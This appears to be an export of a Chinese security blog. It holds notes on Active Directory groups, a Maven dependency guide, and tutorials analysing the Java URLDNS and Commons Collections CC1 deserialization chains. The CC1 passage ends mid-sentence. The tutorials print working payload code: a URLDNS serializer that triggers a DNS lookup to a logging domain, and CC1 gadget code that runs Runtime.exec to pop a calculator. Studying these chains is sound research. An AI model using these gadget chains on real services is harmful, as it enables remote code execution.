可以将某个全局组添加到同一个域的另一个全局组中，或者添加到其他域的通用组和域本地组中（不能添加到不同域的全局组中，全局组只能在创建它的域中添加用户和组）。虽然可以通过全局组授予用户访问任何域内资源的权限，但一般不直接用它来进行权限管理。 全局组和域本地组的关系，与域用户账号和本地账号的关系类似。域用户账号可以在全局使用，即在本域和其他关系的其他域中都可以使用，而本地账号只能在本机中使用。例如：将用户张三（Z3）添加到域本地组 Administrators 中，并不能使 Z3 对非 DC 的域成员计算机拥有任何特权。但若将 Z3 添加到全局组 Domain Admins 中，用户张三就成为了域管理员了（可以在全局使用，对域成员计算机拥有特权）。 3、通用组 多域用户访问多域资源。 通用组的成员可包括域树或域林中任何域的用户账号、全局组和其他通用组，可以在该域森林的任何域中指派权限，可以嵌套在其他组中，非常适合在域森林内的跨域访问中使用。不过，通用组的成员不是保存在各自的域控制器中，而是保存在全局编录（GC）中，任何变化都会导致全林复制。 全局编录通常用于存储一些不经常发生变化的信息。由于用户账号信息是经常变化的，建议不要直接将用户账号添加到通用组中，而要先将用户账号添加到全局组中，再把这些相对稳定的全局组添加到通用组中。 简单一句话概括： 域本地组：来自全林，作用于本域 全局组：来自本域，作用于全林 通用组：来自全林，作用于全林 4、A-G-DL-P 策略 A-G-DL-P 策略是指将用户账号添加到全局组中，再将全局组添加到域本地组中，然后为域本地组分配资源权限。 A 表示用户账号（Account） G 表示全局组（Global Group） U 表示通用组（Universal Group） DL 表示域本地组（Domain Local Group） P 表示资源权限（Permission） 按照 A-G-DL-P 策略对用户进行组织和管理是非常容易的。在 A-G-DL-P 策略形成以后，当需要给一个用户添加某个权限时，只要把这个用户添加到某个域本地组中就行了。 5、内置组 在安装域控制器时，系统会自动生成一些组，称为内置组。内置组定义了一些常用的权限。通过将用户添加到内置组中可以使用户获得相应的权限。 活动目录控制台窗口的 Builtin 和 Users 组织单元中的组就是内置组。 内置的域本地组在 Builtin 组织单元中。 内置的全局组合通用组在 Users 组织单元中。 6、几个比较重要的域本地组 管理员组（Administrators）：该组的成员可以不受限制地存取计算机&#x2F;域内的资源。它不仅是最具权利的一个组，也是在活动目录和域控制器中默认具有管理员权限的组。该组的成员可以更改 Enterprise Admins、Schema Admins 和 Domain Admins 组的成员关系，是域森林中强大的服务管理组。 远程登录组（Remote Desktop Users）：该组的成员具有远程登录权限。 打印机操作员组（Print Operators）：该组的成员可以管理网络打印机，包括建立，管理及删除网络打印机，并可以在本地登录和关闭域控制器。 账号操作员组（Account Operators）：该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。但是，不能更改属于 Administrators 或 Domain Admins 组的账号，也不能更改这些组。在默认情况下，该组中没有成员。 服务器操作员组（Server Operators）：该组的成员可以管理域服务器，其权限包括建立、管理、删除任意服务器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘、锁定服务器、变更服务器的系统时间、关闭域控制器等。在默认情况下，该组中没有成员。 备份操作员组（Backup Operators）：该组的成员可以在域控制器中执行备份和还原操作，并可以在本地登录和关闭域控制器。在默认情况下，该组中没有成员。 7、几个比较重要的全局组、通用组的权限 域管理员组（Domain Admins）：该组的成员在所有加入域的服务器、域控制器和活动目录中均默认拥有完整的管理员权限。因为该组会被添加到自己所在域的 Administrators 组中，所以可以继承 Administrators 组的所有权限。同时，该组默认会被添加到每台域成员计算机的本地 Administrators 组中。这样，Domain Admins 组就获得了域中所有计算机的所有权。如果希望某用户成为域系统管理员，建议将该用户添加到 Domain Admins 组中，而不要直接将该用户添加到 Administrators 组中。 企业系统管理员组（Enterprise Admins）：该组是域森林根域中的一个组。该组在域森林中的每个域内都是 Administrators 组的成员，因此对所有域控制器都有完全访问权。 域用户组（Domain Users）：该组是所有的域成员，在默认情况下，任何由我们建立的用户账号都属于 Domain Users 组，而任何由我们建立的计算机账号都属于 Domain Computers 组。因此，如果想让所有的账号都获得某种资源存取权限，可以将该权限指定给域用户组，或者让域用户组属于具有该权限的组。域用户组默认是内置域 Users 组的成员。 架构管理员组（Schema Admins）：该组是域森林根域中的一个组，可以修改活动目录和域森林的模式。该组是为活动目录和域控制器提供完整权限的域用户组，因此，该组成员的资格是非常重要的。","categories":["内网渗透"]},{"title":"配置篇 - Maven 手动下载与导入依赖","path":"/2024/05/10/Java 安全/配置篇-Maven手动下载与导入依赖/","content":"遇到 maven 无法自动导入的依赖怎么办，本文介绍了如何手动下载与导入 maven 依赖 遇到 maven 无法自动导入的依赖怎么办推荐博客：maven 项目手动导入 jar 包依赖 第一步，在网上下载依赖 jar 包比较推荐 nowjava （时代java）这个网站。 比如我要下载 javax.el-api-3.0.0.jar ，那么访问网址 https://nowjava.com/jar/detail/m03040939/javax.el-api-3.0.0.jar.html 即可，往下翻，有下载 jar 包的链接： 下载好之后复制文件路径：”C:\\Users\\miaoj\\Downloads\\javax.el-api-3.0.0.jar” 。 第二步，idea 中导入 jar 包file &#x3D;&gt; project Structure &#x3D;&gt; modules &#x3D;&gt; Dependencies &#x3D;&gt; 点击加号 &#x3D;&gt; 选择第一项 JARs or Directories 将文件地址粘贴进去，确定即可。 第三步，将 jar 包手动添加到 maven 本地仓库中打开 idea 的 Terminal 终端进入 Windows 命令提示符，输入以下命令： 1mvn install:install-file -Dfile=&quot;C:\\Users\\miaoj\\Downloads\\javax.el-api-3.0.0.jar&quot; -DgroupId=javax.el -DartifactId=javax.el-api -Dversion=3.0.0 -Dpackaging=jar -DgroupId：pom 文件中的 groupId -DartifactId：pom 文件中的 artifactId -Dversion：pom 文件中的 version -Dpackaging：导入包的类型，这里是 jar 类型 -Dfile：jar 包所在路径 在执行结果中可以看到 jar 包已被导入 maven 本地仓库： 完成之后，查看 pom.xml 文件可以发现原来的依赖不再爆红： 12345&lt;dependency&gt; &lt;groupId&gt;javax.el&lt;/groupId&gt; &lt;artifactId&gt;javax.el-api&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt;&lt;/dependency&gt;","categories":["Java 安全"]},{"title":"漏洞篇 - URLDNS 利用链分析","path":"/2024/05/10/Java 安全/漏洞篇-URLDNS利用链分析/","content":"本文详尽地讲述了 URLDNS 反序列化利用链的原理 URLDNS 利用链分析推荐博客：JAVA反序列化-ysoserial-URLDNS原理分析 URLDNS 反序列化利用链的结果就是发起一次 URL 请求，在 DNS 服务器上留下一条解析记录，常常作为验证漏洞是否存在的手段。 具体的利用点在 URL 类的 hashcode 函数中在 Java 中，hashCode() 是 Object 类中的一个方法，用于返回一个对象的哈希码（hash code），该哈希码是一个 int 类型的数值，代表了该对象的特定标识符。 哈希码的主要作用是在集合中进行元素的快速查找，比如在 HashMap 和 HashSet 中。 先来看一个简单的示例： 首先在 Yakit 上生成一个可用域名：ihqkfolumv.dgrh3.cn 写好如下 Java 程序： 12345678910import java.net.MalformedURLException;import java.net.URL;public class Main &#123; public static void main(String[] args) throws MalformedURLException &#123; // 调用URL类的hashCode方法发起DNS请求 URL url = new URL(&quot;http://ihqkfolumv.dgrh3.cn&quot;); url.hashCode(); &#125;&#125; 其中，ihqkfolumv.dgrh3.cn 是我们自己生成的域名，用于被 Java 程序访问，这样在 DNS 服务器上就会留下一条访问记录。 运行后在 Yakit 这里会留下一条解析记录： 下面来查看源代码了解原理Ctrl + 鼠标左键点击进入 URL 类的 hashcode 方法： 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; 可以看到，这里先做了一个判断，然后调用了 handler 的 hashCode 方法。而 handler 是 URL 类中定义的一个属性： 1transient URLStreamHandler handler; 接着 Ctrl + 鼠标左键点击进入 handler 对象（也即 URLStreamHandler 类）的 hashcode 方法： 123456789101112131415161718192021222324252627282930313233343536protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) &#123; h += addr.hashCode(); &#125; else &#123; String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); &#125; // Generate the file part. String file = u.getFile(); if (file != null) h += file.hashCode(); // Generate the port part. if (u.getPort() == -1) h += getDefaultPort(); else h += u.getPort(); // Generate the ref part. String ref = u.getRef(); if (ref != null) h += ref.hashCode(); return h;&#125; 这个方法传入一个 URL 类作为参数，依次通过调用 getProtocol ，getHostAddress，getFile，getPort，getRef 等方法获取到传入的 URL 链接的 Protocol（协议），HostAddress（主机地址），File（文件路径），Port（端口），Ref（锚点，即 # 后面的部分），获取完之后，对每部分调用它们的 hashCode 方法，将结果加到 h 上，最后将 h 返回。 不过，我们需要重点关注的是 getHostAddress 方法，该方法会返回一个 IP 地址，如果遇到的是域名，那么就需要发起 DNS 请求来将其解析成 IP 地址。 Ctrl + 鼠标左键点击进入 getHostAddress 方法： 123456789101112131415161718protected synchronized InetAddress getHostAddress(URL u) &#123; if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.equals(&quot;&quot;)) &#123; return null; &#125; else &#123; try &#123; u.hostAddress = InetAddress.getByName(host); &#125; catch (UnknownHostException ex) &#123; return null; &#125; catch (SecurityException se) &#123; return null; &#125; &#125; return u.hostAddress;&#125; 如果 u.hostAddress 为空，那么调用 URL 类的 getHost 方法获取主机地址（可以是 IP 也可以是域名），如果获取到的主机地址不为空，那么会调用 InetAddress 类的静态方法 getByName 并将主机名作为参数传入。 重点来了：InetAddress.getByName 是一个强大而实用的方法，它允许我们根据主机名获取对应的 IP 地址，并在各种网络应用场景中发挥巨大的作用。 在这里就涉及到了 DNS 解析，那么这条利用链的功能也就是归于此处。再往下的源码就不看了，有兴趣可以自己看看。 反序列化利用入口类 HashMap选择该类作为入口类的原因很简单： 实现了 Serializable 接口，可以被反序列化 1public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable 重写了 readObject 方法 参数类型宽泛，只要是 Object 都可以 JDK 自带 …… 构造 payload先看结果，后面再讲原理 序列化类 serialization 123456789101112131415public class serialization &#123; public static void main(String[] args) throws Exception &#123; HashMap hashMap = new HashMap(); URL url = new URL(&quot;http://jhdmbaithu.dgrh3.cn&quot;); Class clazz = Class.forName(&quot;java.net.URL&quot;); Field f = clazz.getDeclaredField(&quot;hashCode&quot;); f.setAccessible(true); hashMap.put(url,&quot;test&quot;); f.set(url,-1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); &#125;&#125; 这个类将 URL 类的对象作为参数传入 hashMap 中，并在 hashMap 用 put 方法将数据存储后利用反射修改了 url 的 hashCode 属性为 -1 。运行后，会将序列化数据输出到 out.bin 文件中，且也会进行一次 DNS 解析。 由于进行了 DNS 解析，本地存在了解析记录，那么第二次解析就不会去请求 DNS 服务器，所以要刷新一下本地的 DNS 缓存，防止之后执行反序列化看不到解析记录 Windows cmd 窗口输入以下命令刷新 DNS 解析缓存： 1ipconfig/flushdns 反序列化类 unserialization 123456public class unserialization &#123; public static void main(String[] args) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); HashMap hashMap = (HashMap) ois.readObject(); &#125;&#125; 执行反序列化后会多出一条解析记录。 执行完序列化和反序列化之后，查看 Yakit ，会出现两次解析记录： 序列化时进行 DNS 解析的原理来看序列化类： 123456789101112131415public class serialization &#123; public static void main(String[] args) throws Exception &#123; HashMap hashMap = new HashMap(); URL url = new URL(&quot;http://jhdmbaithu.dgrh3.cn&quot;); Class clazz = Class.forName(&quot;java.net.URL&quot;); Field f = clazz.getDeclaredField(&quot;hashCode&quot;); f.setAccessible(true); hashMap.put(url,&quot;test&quot;); f.set(url,-1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); &#125;&#125; 序列化时调用了 HashMap 的 put 方法，查看 put 方法： 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; put 方法中又调用了 HashMap 的 hash 方法，查看 hash 方法： 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 可以看到，hash 方法中调用了 key 的 hashCode 方法，而 key 就是我们传入的 URL 对象，也即调用了 URL 对象的 hashCode 方法，因此进行了 DNS 解析。 为什么要用反射修改 url 的 hashCode 属性值 调用了 url 的 hashCode 方法之后，url 的 hashCode 属性便不再是 -1（初始值为 -1 ，调用 hashCode 方法之后会生成新的值），结合 URL 类的 hashCode 方法来看： 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; 下一次调用 url 的 hashCode 方法就不会再调用 handler.hashCode 方法，也就不会进行 DNS 解析了。为了之后的反序列化能够顺利进行 DNS 解析，这里用反射来修改 url 的 hashCode 属性值重新为 -1 。 反序列化时进行 DNS 解析的原理来看反序列化类： 123456public class unserialization &#123; public static void main(String[] args) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); HashMap hashMap = (HashMap) ois.readObject(); &#125;&#125; 由于 HashMap 重写了 readObject 方法，因此在调用时不会调用 ObjectInputStream 默认的 readObject 方法，而是会调用 HashMap 重写的 readObject 方法。 查看 HashMap 的 readObject 方法： 12345678910111213141516171819202122232425262728293031323334353637383940private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125;&#125; 很多很杂，但其实前面的都不重要，直接看末尾的 for 循环中的最后一条语句： 1putVal(hash(key), key, value, false, false); 见过吧，其实跟序列化时的 put 方法中的内容是一样的，一样的调用了 hash 方法： 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 一样的调用了 key 的 hashCode 方法，也即 URL 对象的 hashCode 方法，进行了 DNS 解析。所以如果前面不把 hashCode 改回 -1 的话，反序列化是不会进行 DNS 解析的哦~","categories":["Java 安全"]},{"title":"漏洞篇 - Java 反序列化之 CC1 链","path":"/2024/05/10/Java 安全/漏洞篇-CC1链分析/","content":"Apache Commons Collections 是对 java.util.Collection 的扩展，对常用的集合操作进行了很好的封装、抽象和补充，在保证性能的同时大大简化代码。CC 链正是在 Commons Collections 包中的反序列化利用链，本次介绍的是 CC1 链。 CC1 链Apache Commons Collections 是对 java.util.Collection 的扩展，对常用的集合操作进行了很好的封装、抽象和补充，在保证性能的同时大大简化代码。 CC 链正是在 Commons Collections 包中的反序列化利用链，本次介绍的是 CC1 链。 环境准备 java &#x3D; 8u65 CommonsCollections &#x3D; 3.2.1 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; Transformer 接口Apache Commons Collections 包中定义的一个接口，该接口的实现类中包含执行类。 12345package org.apache.commons.collections;public interface Transformer &#123; Object transform(Object var1);&#125; 该类中声明了一个 transform 方法。 鼠标双击选中类名后，Ctrl + H 可以查看该类的继承关系： 执行类 InvokerTransformer该类实现了 Transformer 接口与 Serializable 接口，定义如下： 1public class InvokerTransformer implements Transformer, Serializable 利用点在 InvokerTransformer 类重写的 transform 方法中：1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var4) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException var5) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException var6) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, var6); &#125; &#125;&#125; 其中， 123Class cls = input.getClass();Method method = cls.getMethod(this.iMethodName, this.iParamTypes);return method.invoke(input, this.iArgs); 会通过反射执行 “input” 类的 “this.iMethodName” 方法，并将 “this.iParamTypes” 类型的参数 “this.iArgs” 传入。 再来看， input 是 transform 方法的参数，iMethodName ，iParamTypes 和 this.iArgs 都是 InvokerTransformer 中定义的属性： 123private final String iMethodName;private final Class[] iParamTypes;private final Object[] iArgs; 并且在 InvokerTransformer 类的三参构造方法中会赋值： 12345public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args;&#125; 也就是说，这里的所有参数均可控，那么可以简单的写个小程序验证一下。 直接利用 InvokerTransformer 弹出计算器12345678public class Demo1 &#123; public static void main(String[] args) &#123; Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); invokerTransformer.transform(runtime); &#125;&#125; 运行结果： 成功弹出计算器，原理就是通过 invokerTransformer.transform 调用了 runtime 对象的 exec 方法并将 “calc” 作为参数传入。 接下来就是要找谁调用了 transform 方法，其实 TransformedMap 类调用了此方法。 利用链之 TransformedMap 类TransformedMap 类的 checkSetValue 方法调用了 this.valueTransformer 的 transform 方法： 123protected Object checkSetValue(Object value) &#123; return this.valueTransformer.transform(value);&#125; 而 valueTransformer 是 TransformedMap 中定义的属性： 1protected final Transformer valueTransformer; 这个属性在构造方法中被赋值： 12345protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;&#125; 由于构造方法是 protected 修饰的，不能直接被调用，所以还要找是谁调用了 TransformedMap 的构造方法。 TransformedMap 的 decorate 方法调用了 TransformedMap 的构造方法： 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; 通过这个方法，我们可以将 valueTransformer 属性赋值成 InvokerTransformer 类的对象。 接下来还要找是谁调用了 TransformedMap 的 checkSetValue 方法，AbstractInputCheckedMapDecorator 类调用了此方法。 利用链之 AbstractInputCheckedMapDecorator 类AbstractInputCheckedMapDecorator 是 TransformedMap 的父类。 MapEntry 静态内部类在这个类中有一个名为 MapEntry 的静态内部类： 12345678910111213static class MapEntry extends AbstractMapEntryDecorator &#123; private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = this.parent.checkSetValue(value); return this.entry.setValue(value); &#125;&#125; MapEntry 的 setValue 方法中调用了 this.parent 的 checkSetValue 方法： 1234public Object setValue(Object value) &#123; value = this.parent.checkSetValue(value); return this.entry.setValue(value);&#125; parent 是 MapEntry 中定义的一个私有属性： 1private final AbstractInputCheckedMapDecorator parent; 这个属性在 MapEntry 的构造方法中被赋值： 1234protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent;&#125; 由于这个构造方法是被 protected 修饰的，所以还是要找是谁调用了它。其实是隔壁的静态内部类 EntrySetIterator 调用了它。 EntrySetIterator 静态内部类EntrySetIterator 也是 AbstractInputCheckedMapDecorator 中的静态内部类： 12345678910111213static class EntrySetIterator extends AbstractIteratorDecorator &#123; private final AbstractInputCheckedMapDecorator parent; protected EntrySetIterator(Iterator iterator, AbstractInputCheckedMapDecorator parent) &#123; super(iterator); this.parent = parent; &#125; public Object next() &#123; Map.Entry entry = (Map.Entry)this.iterator.next(); return new MapEntry(entry, this.parent); &#125;&#125; 可以看到 EntrySetIterator 的 next 方法中调用了 MapEntry 的构造方法： 1234public Object next() &#123; Map.Entry entry = (Map.Entry)this.iterator.next(); return new MapEntry(entry, this.parent);&#125; 那么为了调用 EntrySetIterator 的 next 方法，我们需要创建一个 EntrySetIterator 对象，但 EntrySetIterator 的构造方法是被 protected 修饰的，所以还要找是谁调用了 EntrySetIterator 的构造方法。 而在隔壁的静态内部类 EntrySet 中调用了 EntrySetIterator 的构造方法 EntrySet 静态内部类EntrySet 也是 AbstractInputCheckedMapDecorator 中的静态内部类： 123456789101112131415static class EntrySet extends AbstractSetDecorator &#123; private final AbstractInputCheckedMapDecorator parent; protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) &#123; super(set); this.parent = parent; &#125; public Iterator iterator() &#123; return new EntrySetIterator(this.collection.iterator(), this.parent); &#125; // 后面的部分省略 ......&#125; EntrySet 的 iterator 方法调用了 EntrySetIterator 的构造方法，同理，在哪里获得 EntrySet 对象呢？ entrySet 成员方法AbstractInputCheckedMapDecorator 类的 public 方法 entrySet 调用了 EntrySet 的构造方法： 123public Set entrySet() &#123; return (Set)(this.isSetValueChecking() ? new EntrySet(this.map.entrySet(), this) : this.map.entrySet());&#125; 但是到这里还有个问题，获得 EntrySet 对象后怎么去调用它的 iterator 方法呢，以及获得 EntrySetIterator 对象后怎么去调用它的 next 方法呢，这个可以通过增强 for 循环遍历 map 来实现访问。 增强 for 循环遍历 map 的底层原理for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet()) 实际上相当于以下的迭代器实现： 12345Iterator&lt;Map.Entry&lt;String, Integer&gt;&gt; iterator = map.entrySet().iterator();while (iterator.hasNext()) &#123; Map.Entry&lt;String, Integer&gt; entry = iterator.next(); // 循环体内的代码&#125; 依此道理，如果将 map 赋值为 AbstractInputCheckedMapDecorator 抽象类的子类， 那么调用 map.entrySet() 方法时，实际上调用的是 AbstractInputCheckedMapDecorator 抽象类中实现的 entrySet() 方法，这个 entrySet() 方法会返回一个 EntrySet 对象， 那么 map.entrySet().iterator() 实际上调用的是 EntrySet 对象的 iterator 方法，而这个方法返回的是一个 EntrySetIterator 对象， 那么在接下来的 while 循环中调用的 iterator.next() 方法其实就是 EntrySetIterator 对象的 next() 方法，这个方法会调用 MapEntry 的构造方法，返回一个 MapEntry 对象， 最终 for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet()) 这个增强 for 获取到的 entry 就是一个 MapEntry 对象， 最后的最后，我们手动调用这个 entry 的 setValue 方法即可。 至此，整条链子就串联起来了。 写个程序实现上面的利用链payload下面的代码运行后会弹出计算器： 123456789101112131415public class Demo2 &#123; public static void main(String[] args) &#123; Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, invokerTransformer); for (Map.Entry entry : transformedmap.entrySet()) &#123; entry.setValue(runtime); &#125; &#125;&#125; 通过调试来理解其中逻辑Java 代码有一个特点，Java 的实例方法调用是基于运行时的实际类型的动态调用，而非变量的声明类型，这就是 Java 的多态性。 也因此，只有当程序运行起来才知道某个方法调用的究竟是哪个类的方法。所以说：调试是学习过程中必不可少的一环。 前面的逻辑应该都好理解，直接在最后一个 for 循环和 setValue 处下断点： 开始调试，单步进入： 此时来到了 AbstractInputCheckedMapDecorator 抽象类的 entrySet 方法，不过严格来说，应该是调用了 TransformedMap 的 entrySet 方法（因为 TransformedMap 继承了 AbstractInputCheckedMapDecorator 抽象类，拥有了它的所有方法，所以 TransformedMap 中其实是有 entrySet 方法的，只不过在代码上看不到） 所以一个很重要的点是，这里的 this 指代的是谁？指代的是 AbstractInputCheckedMapDecorator 吗？不对，指代的是 TransformedMap 对象，一定记住，因为后续会将这个值层层传递下去。 继续单步进入： 此时来到了 TransformedMap 重写的 isSetValueChecking 方法，由于 valueTransformer 已经被赋值，所以这里应当返回 true 。 继续单步进入： 由于上一步返回 true ，所以这里应当会调用 EntrySet 的构造方法。 继续单步进入： 调用了 EntrySet 的构造方法，并传入一个 TransformedMap 对象给 EntrySet 的私有属性 parent 赋值。 这里可以不用看了，直接 step out 跳出： 回到 entrySet 成员方法这里，此时应当返回一个 EntrySet 对象。 继续单步进入： 此时回到初始代码，准备开始 for 循环。 继续单步进入： 此时来到了 EntrySet 的 iterator 方法，获取 EntrySetIterator 对象。 继续单步进入，选择查看 EntrySetIterator 构造方法： 构造方法中将 EntrySet 的 parent 传了过来，赋值给了自己的私有属性 parent ，此时它是一个 TransformedMap 对象。 这里可以不用看了，直接 step out 跳出： 回到迭代器这里，这个方法将会返回一个 EntrySetIterator 对象。 继续单步进入： 回到了初始代码。 继续单步进入： 开始进行 hasNext 判断，因为是第一次遍历，集合中有值，这里应当返回 true 。 继续单步进入： 回到了初始代码。 继续单步进入： 此时来到了 EntrySetIterator 的 next 方法。 第一步可以不用看，直接 step over 进入下一步，再单步进入： 此时来到了 MapEntry 的构造方法，将 EntrySetIterator 的 parent 值传给了自己的私有属性 parent ，此时它是一个 TransformedMap 对象。 接下来可以不用看了，step out 跳出构造方法，再跳出 EntrySetIterator 的 next 方法，回到初始代码这里： 此时的 entry 是一个 MapEntry 对象，单步进入它的 setValue 方法： 接下来会进入 this.parent 的 checkSetValue 方法，如上所言，this.parent 应当指代的是 TransformedMap 对象，那么接下来会调用这个 TransformedMap 对象的 checkSetValue 方法，单步进入看看： 没问题，接下来会调用 valueTransformer 的 transform 方法，valueTransformer 已经被赋值为一个 InvokerTransformer 对象，接下来将会调用 InvokerTransformer 的 transform 方法。 单步进入： 这个 InvokerTransformer 对象也已经被初始化，前面的 setValue 的参数 runtime 传递给了 checkSetValue ，最后又传递给了 transform ，所以这里的 input 参数应当是一个 Runtime 对象。 到这里就可以直接下一步下一步了，执行完 method.invoke 就会弹出计算器： 好了，后面的就不调了。通过这次调试，想必逻辑大致能理清楚了。 反序列化利用作为一条反序列化利用链，最终还是要归到 readObject 这里，毕竟实际情况下 setValue 可不是我们自己能手动调用的，所以我们要找谁的 readObject 方法里调用了 setValue 。 AnnotationInvocationHandler 类的 readObject 方法里就调用了 setValue 。 入口类 AnnotationInvocationHandler看看 readObject 方法： 1234567891011121314151617181920212223242526private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; var1.defaultReadObject(); AnnotationType var2 = null; try &#123; var2 = AnnotationType.getInstance(this.type); &#125; catch (IllegalArgumentException var9) &#123; throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) &#123; Map.Entry var5 = (Map.Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) &#123; Object var8 = var5.getValue(); if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123; var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6))); &#125; &#125; &#125;&#125; 有没有发现跟前面增强 for 循环的底层原理有几分神似？如果没有发现的话我把这一段截取出来： Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) &#123; Map.Entry var5 = (Map.Entry)var4.next(); 依葫芦画瓢，我们想让这个 memberValues 变成 TransformedMap 对象，那么同理 var5 将会被赋值为一个 MapEntry 对象。在之后经过两重判断，就会调用 var5 的 setValue 了。 memberValues 是 AnnotationInvocationHandler 类中定义的一个属性： 1private final Map&lt;String, Object&gt; memberValues; 而这个属性在构造方法中被赋值： 123456789AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123; this.type = var1; this.memberValues = var2; &#125; else &#123; throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); &#125;&#125; 但是由于构造方法没有被 public 修饰（不写修饰符默认 default ），不能直接调用，所以我们用反射来获取构造方法。 在构造方法中我们也可以看到对传入的参数 var1 做了一些检查： var3 = 